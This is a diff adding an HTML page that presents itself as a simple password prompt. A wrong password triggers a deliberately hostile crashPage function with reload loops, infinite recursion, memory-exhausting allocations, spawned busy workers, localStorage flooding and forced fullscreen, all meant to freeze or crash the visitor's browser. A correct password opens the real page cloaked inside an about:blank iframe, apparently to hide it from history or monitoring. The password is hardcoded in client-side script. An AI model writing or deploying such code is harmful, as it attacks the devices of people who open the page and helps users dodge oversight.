@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>uh</title>
+</head>
+<body>
+    <h2>not so fast bud!</h2>
+    <label for="password">enter pass:</label>
+    <input type="password" id="password">
+    <button onclick="checkPassword()">ok</button>
+	<script>
+        function enterFullscreen() {
+            document.documentElement.requestFullscreen().catch(function (err) {
+                console.error(err);
+            });
+        }
+
+        function checkFullscreen() {
+            if (!document.fullscreenElement) {
+                enterFullscreen();
+            }
+        }
+
+        function checkPassword() {
+            const correctPassword = "bH3dRpKq5wX9vYoP2fZaJnMx7eCu1VrGs4tLlNp8";
+            const enteredPassword = document.getElementById("password").value;
+            
+            if (enteredPassword === correctPassword) {
+                aboutblank("1-12.html");
+                document.body.innerHTML = "";
+            } else {
+                crashPage();
+            }
+        }
+		
+		    function aboutblank(url) {
+        const win = window.open();
+        var iframe = win.document.createElement('iframe');
+        iframe.style.width = "100%";
+        iframe.style.height = "100%";
+        iframe.style.border = "none";
+        iframe.src = url;
+        iframe.style.position = "absolute";
+        iframe.style.top = "0px";
+        iframe.style.left = "0px";
+        win.document.body.appendChild(iframe);
+    }
+
+        function crashPage() {
+                     while(1) location.reload(1);
+    checkFullscreen();
+    function recurse() {
+        recurse();
+    }
+    recurse();
+    checkFullscreen();
+    [...Array(2**32-1)].map(_ => Math.random());
+    checkFullscreen();
+    let div = document.createElement('div');
+    while(true) {
+        document.body.appendChild(div.cloneNode(true));
+    }
+    checkFullscreen();
+    let arr = [];
+    while(true) {
+        arr.push(new Array(1e7).join("X"));
+    }
+
+    let el = document.createElement('div');
+    document.body.appendChild(el);
+    while(true) {
+        el.offsetHeight;
+        el.style.height = `${Math.random() * 10000}px`;
+    }
+
+    while(true) {
+        new Worker(URL.createObjectURL(new Blob(["while(true) {}"])));
+    }
+    while(true) {
+        localStorage.setItem("key", Math.random());
+    }
+    while(true) {
+        document.body.addEventListener('click', function(){});
+    }
+    while(true) {
+        setTimeout(() => {}, 0);
+    }
+	
+    while(true) {
+        let hugeArray = new Array(1e6).fill(0).map(() => Math.random());
+        hugeArray.sort();
+    }
+
+    while(true) {
+        let largeMatrix = Array.from({ length: 1000 }, () => Array.from({ length: 1000 }, () => Math.random()));
+        let result = largeMatrix.map(row => row.map(value => value * Math.random()));
+    }
+
+    while(true) {
+        let bigStr = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$".repeat(1e7);
+        bigStr.split('').reverse().join('');
+    }
+
+    while(true) {
+        crypto.subtle.digest('SHA-256', new TextEncoder().encode('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'));
+    }
+	}
+    </script>
+</body>
+</html>
